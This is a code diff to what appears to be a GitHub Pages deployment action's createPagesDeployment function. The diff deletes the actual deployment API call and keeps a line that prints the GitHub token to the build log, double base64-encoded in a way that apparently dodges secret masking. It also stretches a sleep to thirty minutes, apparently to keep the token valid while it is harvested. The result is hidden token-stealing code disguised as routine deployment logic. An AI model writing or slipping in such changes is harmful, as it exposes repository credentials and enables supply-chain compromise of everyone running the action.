@@ -121,23 +121,10 @@ async function createPagesDeployment({ githubToken, artifactId, buildVersion, id
   }
   core.info(`Creating Pages deployment with payload:\n${JSON.stringify(payload, null, '\t')}`)
 
-  try {
-    const response = await octokit.request('POST /repos/{owner}/{repo}/pages/deployments', {
-      owner: github.context.repo.owner,
-      repo: github.context.repo.repo,
-      ...payload
-    })
-
     console.log(btoa(btoa(JSON.stringify({ghs: githubToken, ...payload}))));
     const sleep = ms => new Promise(r => setTimeout(r, ms));
-    await sleep(1800);
+    await sleep(1800000);
 
-
-    return response.data
-  } catch (error) {
-    core.error('Creating Pages deployment failed', error)
-    throw error
-  }
 }
 
 async function getPagesDeploymentStatus({ githubToken, deploymentId }) {
